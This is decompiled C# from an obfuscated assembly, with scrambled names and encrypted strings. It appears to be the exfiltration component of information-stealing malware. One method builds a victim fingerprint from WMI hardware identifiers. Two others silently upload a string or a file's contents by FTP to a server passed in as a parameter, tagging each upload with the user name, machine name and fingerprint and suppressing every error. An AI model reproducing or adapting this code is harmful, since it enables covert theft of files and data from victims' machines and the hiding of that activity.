using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace YBTDaqZXTw;

internal sealed class ZTOrHfhPbpGY
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string HenIHgeFzZlR()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		ManagementClass val = new ManagementClass(getString_0(107406595));
		ManagementObjectCollection instances = val.GetInstances();
		ManagementObjectEnumerator enumerator = instances.GetEnumerator();
		try
		{
			if (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107406542)).get_Value()
					.ToString();
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		string text2 = getString_0(107406557);
		ManagementObject val3 = new ManagementObject(getString_0(107406552) + text2 + getString_0(107406479));
		val3.Get();
		string text3 = ((ManagementBaseObject)val3).get_Item(getString_0(107406474)).ToString();
		return text3 + text;
	}

	public static void wrwlEKykDmsYULM(string MDUDCiFfrUk = "URL", string LuCFlCoZwSn = "USERNAME", string KzHlUrJBoghr = "ACCESO", string aYUjAynnvB = "")
	{
		try
		{
			string text = HenIHgeFzZlR();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(MDUDCiFfrUk + getString_0(107407800) + Environment.UserName + getString_0(107407755) + Environment.MachineName + getString_0(107407766) + text + getString_0(107407217));
			ftpWebRequest.Method = getString_0(107406961);
			ftpWebRequest.Credentials = new NetworkCredential(LuCFlCoZwSn, KzHlUrJBoghr);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(aYUjAynnvB);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void etRpUbdkuxt(string KPJLuvInym = "URL", string IdijExMKsQzfbdB = "USERNAME", string YXeJWkPahoDkjvv = "ACCESO", string hACebSsGGewxUBeX = "")
	{
		try
		{
			string text = HenIHgeFzZlR();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(KPJLuvInym + getString_0(107407800) + Environment.UserName + getString_0(107407755) + Environment.MachineName + getString_0(107407766) + text + getString_0(107407217));
			ftpWebRequest.Method = getString_0(107406961);
			ftpWebRequest.Credentials = new NetworkCredential(IdijExMKsQzfbdB, YXeJWkPahoDkjvv);
			byte[] bytes;
			using (StreamReader streamReader = new StreamReader(hACebSsGGewxUBeX))
			{
				bytes = Encoding.UTF8.GetBytes(streamReader.ReadToEnd());
			}
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	static ZTOrHfhPbpGY()
	{
		Strings.CreateGetStringDelegate(typeof(ZTOrHfhPbpGY));
	}
}
